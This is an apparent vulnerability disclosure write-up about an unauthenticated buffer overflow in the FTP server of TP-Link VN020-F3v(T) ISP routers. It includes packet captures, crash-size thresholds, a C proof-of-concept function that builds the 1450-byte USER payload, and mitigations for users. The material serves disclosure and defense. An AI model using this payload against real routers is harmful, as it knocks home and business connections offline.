 
# Critical FTP Server Vulnerability in TP-Link VN020-F3v(T) Routers 

## Overview

A buffer overflow and memory corruption vulnerability was found in VN020-F3v(T) router. It’s part of TP-Link’s custom firmware, built for ISPs but running on the same base firmware with tweaks for specific markets. This model is super common in countries like Tunisia, Algeria, and Morocco—and it’s still being actively sold.

The vulnerability comes from how the router handles certain FTP payloads mainly, allowing an attacker to crash the router with a specially crafted payload or cause memory corruption and open doors for potential exploitation.

---

## Technical Analysis

### Vulnerability Details

- **Type:** Buffer Overflow / Memory Corruption 
- **Attack Vector:** FTP USER Command
- **Impact:** Immediate Router Crash, Mmemory corruption, Persistent effects post exploitation
- **Authentication:** Not Required
- **Complexity:** Low
- **User Interaction:** None Required

**Affected Devices:**
- Router Model: TP-Link VN020-F3v(T)
- Firmware Version: TT_V6.2.1021
- Hardware Version: 1.0
- Deployment: Primarily through Tunisie Telecom and Topnet ISPs
- Confirmed Variants: Also affects Algerian and Moroccan versions

### Nature of the Vulnerability

The vulnerability stems from **improper handling of user input** within TP-Link's FTP server. Specifically, the server **fails to validate the length** of the username provided during the login process. The observed behavior varies based on the payload size:

- **1100 'A's:** Partial leading to a **delayed crash** after a 5 to 10 seconds.
- **1450 'A's:** Instant triggering an **immediate crash**.
- **>1450 'A's:** This results in **undefined behavior** without crashing.

Indicating extremely weird behavior and that this goes beyond just a regular buffer overflow 
## Packet Capture and Exploit Code Analysis (Wireshark Packet dissections)
The interaction between a client and the TP-Link router's FTP server reveals the malicious payload that triggers the crash.

```plaintext
No.     Time           Source                Destination           Protocol Length Info
     77 2.467891       192.168.1.1           192.168.1.21          FTP      99     Response: 220 FTP server (GNU inetutils 1.4.1) ready.
```

**Frame 77 Details:**

- **Src IP**: 192.168.1.1
- **Dst IP**: 192.168.1.21
- **Protocol**: FTP
- **Payload Length**: 99 bytes

```plaintext
No.     Time           Source                Destination           Protocol Length Info
     78 2.471668       192.168.1.21          192.168.1.1           FTP      1511   Request: USER AAAAAAAAAA...AAAAAAAAA (1450 'A's)
```

**Frame 78 Details:**

- **Src IP**: 192.168.1.21
- **Dst IP**: 192.168.1.1
- **Protocol**: FTP
- **Payload Length**: 1450 bytes of 'A's appended to the `USER` command.

### TCP Stream Analysis

```plaintext
Frame Analysis:
1. Initial Banner (Frame 77)
   - TCP Flags: PSH, ACK
   - Window Size: 8192
   - Normal FTP banner behavior
   
2. Exploit Packet (Frame 78)
   - TCP Flags: PSH, ACK
   - Window Size: 65490
   - Payload Length: 1457 bytes (Including USER command)
   - No fragmentation (DF bit set)
   
3.  Timing:
   - Only 3.777ms between banner and crash
   - No 331 Password Required response
   - No TCP RST or FIN observed
```

**Diagram: TCP Stream Flow**

```
+----------------+                      +------------------------+
|    Client      |                      |   VN020-F3v FTP Server |
+----------------+                      +------------------------+
        |                                        |
        |-------- CONNECT (TCP SYN) ------------>|
        |<------- CONNECT ACK (TCP SYN-ACK) -----|
        |-------- ACK (TCP ACK) ---------------->|
        |                                        |
        |<------- 220 FTP Banner ----------------|
        |                                        |
        |-------- USER + 1450 'A's (1457B) ----->|
        |                                        |
        |      [CRASH NO FURTHER RESPONSE]       |
        |                                        |
        +----------------------------------------+
```

1. **Connection Establishment**: The client connects and receives the FTP banner.
2. **Malicious USER Command**: Sends `USER` with exactly 1450 'A's.
3. **Crash Induction**: The server crashes immediately upon processing the oversized input, evidenced by the absence of any further responses or TCP session termination signals.

### Delayed Crash Mechanism

The vulnerability exhibits an interesting nuanced behavior when varying the payload size, specifically in the range of around 1100 bytes:

#### Delayed Crash Characteristics

- Payload Trigger: 1100 bytes of consecutive 'A' characters
- Initial Server Response: 
  - Server responds normally with "331 Password Required" message
  - Appears to initially handle the oversized input without immediate crash
    
- Crash Mechanism: 
  - Delayed crash occurs approximately 5-10 seconds after initial command
  - No explicit error messages or TCP reset signals
  - Suggests internal buffer overflow or memory corruption process
#### TCP Stream Flow

```

+----------------+                      +------------------------+
|    Client      |                      |   VN020-F3v FTP Server |
+----------------+                      +------------------------+
        |-------- USER cmd (1100 'A's) ->|
        |<------- 331 Password Prompt ---|
        |                                |
        |   [5-10 second quiet period]   |
        |                                |
        |      [ROUTER CRASHES]          |
        +--------------------------------+

```
### Implementation Flaws in TP-Link Modifications

Unlike the standard **GNU inetutils 1.4.1**, which gracefully handles oversized inputs, VN020-F3v(T) FTP implemenation looks like have introduced many flaws:

- **Improper Buffer Allocation**: Allocates insufficient memory for handling large `USER` inputs.
- **Lack of Input Validation**: Fails to enforce maximum length constraints on the `USER` command.
- **Memory Management Errors**: Uses unsafe functions smost likely
- **Resource Constraints**: Limited router memory and environment most likely also are a contributor to this

These flaws collectively result in severe memory corruption, making the vulnerability unique to TP-Link's implementation and router hardware.

### Proof of Concept (PoC) Code

Below is the provided C-based PoC demonstrating how different payload sizes affect the FTP server:
 ```c
char* generate_exact_crash_payload() {
    char* payload = (char*)malloc(TOTAL_PAYLOAD_LENGTH + 1);  // +1 for null terminator
    if (!payload) {
        log_msg("[-]", "Failed to allocate payload memory");
        return NULL;
    }

    // Construct the exact payload that causes crash
    strcpy(payload, "USER ");                            // 5 bytes
    memset(payload + 5, 'A', CRASH_STRING_LENGTH);      // 1450 'A's
    memcpy(payload + 5 + CRASH_STRING_LENGTH, "\r\n", 2); // 2 bytes
    payload[TOTAL_PAYLOAD_LENGTH] = '\0';

    char debug_msg[100];
    snprintf(debug_msg, sizeof(debug_msg), "Generated payload of length %d ('A's + 5 byte prefix + 2 byte suffix)",
        TOTAL_PAYLOAD_LENGTH);
    log_msg("[*]", debug_msg);

    return payload;
}
```  
### Instant crash Proof of Concept: 

https://github.com/user-attachments/assets/c874edb8-f1fe-442b-beb4-df9f5ccb0373

### Delayed crash Proof of Concept: 
 
https://github.com/user-attachments/assets/8b6aca34-c9b3-4c82-95f9-c858925a096e

### Undefined Behavior with Buffer > 1450: Critical State Corruption

When inputs exceeding 1450 bytes are processed, the FTP server enters an **unstable state** marked by authentication corruption, erratic command execution, and severe resource mismanagement. These symptoms highlight critical vulnerabilities with a high potential for exploitation.

#### CLI Demonstration

1. **Malformed `USER` Command Causes Authentication Corruption**:
   ```bash
   ftp> user AAAA..AAAA
   331 Password required for AAAA..AAAA.
   Password:
   500 'A': command not understood.
   Login failed.
   ftp> cd aaaaaaaaaa/bbbbbbbbbb/cccccccccc/dddddddddd/eeeeeeeeee/ffffffffff/gggggggggg/hhhhhhhhhh/iiiiiiiiii/jjjjjjjjjjjjjjjjjjjjjjjjj
   230 User user AAAAA...AAAA logged in. (What??)
   ```
   - **Critical Flaw**: The server falsely reports the malformed user as "authenticated" (`230 User user AAAAA...AAAA logged in`), demonstrating state corruption, the user is not authenticated nor is it valid, so this message is indicating that there's something happening that's being induced 
     by these commands specifically.

2. **Connection Termination Due to Signal 13 (Broken pipe)**:
   ```bash
   ftp> user AAAAAA.....AAAAA
   331 Password required for AAAAAA.....AAAAA.
   Password:
   500 'A': command not understood.
   Login failed.
   ftp> cd aaaaaaaaaa/bbbbbbbbbb/cccccccccc/dddddddddd/eeeeeeeeee/ffffffffff/gggggggggg/hhhhhhhhhh/iiiiiiiiii/jjjjjjjjjjjjjjjjjjjjjjjjj
   ftp: lostpeer due to signal 13
   ```
   - Signal 13 (broken pipe) indicates that the server abruptly terminates the connection, likely due to memory corruption or resource exhaustion caused by oversized inputs this does not happen always and I've been able to reproduce it only a couple of times one of them where the server signal 13 is 
     sent then the router crashes, i have managed to reproduce it a second time on video which is attached below.

3. **Erratic Command Execution and Resource Leaks**:
   ```bash
   ftp> get test.txt
   500 'SIZE test.txt': command not understood.
   229 Entering Extended Passive Mode (|||4116|).
   200 PORT command successful.
   ftp> ls
   500 not find 'test.txt' .
   ftp: Can't bind for data connection: Address already in use
   ftp> ls
   200 PORT command successful.
   ftp> ls
   150 opening ASCII mode data connection for '/bin/ls'.
   ```
   - **Flaw**: The server fails to handle resources correctly, leading to persistent errors such as `Can't bind for data connection`, some commands error before executing have to execute them multiple times to get any result.

4. **Partial Functionality Despite Corruption**:
   ```bash
   ftp> passive
   Passive mode: on; fallback to active mode: on.
   ftp> ls
   150 opening ASCII mode data connection for '/bin/ls'.
   227 Entering Passive Mode (192,168,1,1,16,20).
   200 PORT command successful.
   ```
   - **Notes**: Commands like `ls` succeed in certain conditions, indicating partial functionality in an otherwise corrupted state.

---

#### Summary of Critical Issues
- **Authentication State Corruption**: Invalid users are marked as logged in.
- **Memory Corruption**: Erratic responses and crashes indicate overwritten memory or buffers.
- **Broken Pipe (Signal 13)**: Abrupt termination reveals fatal errors in connection handling.
- **Resource Mismanagement**: Persistent errors like `Can't bind for data connection` highlight severe flaws in cleanup routines.
- **Protocol Violations**: The server fails to enforce proper state transitions or input validation.

This instability represents a risk, with high potential for **denial of service (DoS)**, **privilege escalation**, and **remote code execution (RCE)**.

### Undefined FTP behavior video: 

https://github.com/user-attachments/assets/5cf62190-97b7-4316-a032-bc3627d3f862



### Hypothesized Internal Mechanisms

Based on the observed behaviors, the following internal mechanisms may be contributing to the vulnerability:

1. **Fixed-Size Buffer with Insufficient Validation:**
   - The FTP server likely allocates a fixed-size buffer (e.g., 1450 bytes) for processing the USER command.
   - **Lack of Proper Length Checks:** The server does not adequately verify if the incoming username exceeds the buffer size, allowing for buffer overflows.

2. **Buffer Overflow:**
   - The USER command processing may involve stack-based buffers.
    
3. **Heap-Based Buffer Overflow:**
   - Alternatively, if the server uses heap-allocated buffers without proper bounds checking, overflows could corrupt heap metadata, leading to erratic behavior or delayed crashes.

4. **Thread Management Flaws:**
   - The server might spawn separate threads for handling FTP commands.
   - **Cross-Thread Memory Corruption:** Overflows in one thread could inadvertently affect the state of others, leading to resource leaks or deadlocks.

5. **Delayed Resource Cleanup:**
   - Partial overflows (1100 'A's) might corrupt flags or pointers used during resource cleanup, causing the server to crash after cleanup routines fail to execute properly.

*Due to the propriatary nature of this firmware not all of these can be confirmed 100% but based on behavior of the router there's a strong possibility towards many of these factors*

---
### Mitigation Strategies

To address this critical vulnerability and protect affected devices, the following mitigation strategies are recommended:

#### **1. For End Users of Affected Routers**
- **Change Default FTP Credentials (Specific to Tunisie Telecom)**:
  - Tunisie Telecom configures routers with **default FTP credentials (`user:user`)**, which is a severe security risk.
  - **Log into the router’s admin panel** and change the FTP password immediately to a strong, unique password.

- **Close Port 21 (FTP)**:
  - If your ISP allows you to you can close this port via the FTP PORT ALG settings.
  - For Tunisie Telecom users, where closing port 21 is not possible:
    - Use an external device, such as a gateway or firewall, to block all FTP traffic at the network level.
---

#### **2. General Recommendation for All ISPs**
- **Close Port 21 on the Router**:
  - ISPs other than Tunisie Telecom often allow customers to manage their router settings. If so, **disable FTP entirely** or block port 21 at the router level.

- **Check for Updated Firmware**:
  - Monitor for firmware updates from TP-Link or your ISP and apply them immediately when available.

- **Replace Outdated or Vulnerable Routers**:
  - Consider upgrading to a modern router with robust security features and better configurability.


---
## Other side effects post exploitation:
![Screenshot 2024-11-25 215648](https://github.com/user-attachments/assets/41bf6595-3776-46e2-94dd-40bb521d751b)

- No internet connection after multiple consecutive crashes needing either full router reset or restarting the router multiple times until it recovers.
## Metadata

```yaml
Version: Firmware TT_V6.2.1021
Discovery Date: 11/24/2024
Reported to Vendor: 11/25/2024
Reported to CNA: 11/26/2024
CVE Status: Pending

```

---

### Author
**Mohamed Maatallah**
- GitHub: [@Zephkek](https://github.com/Zephkek)
- Affiliation: Student & Independent Security Researcher

---




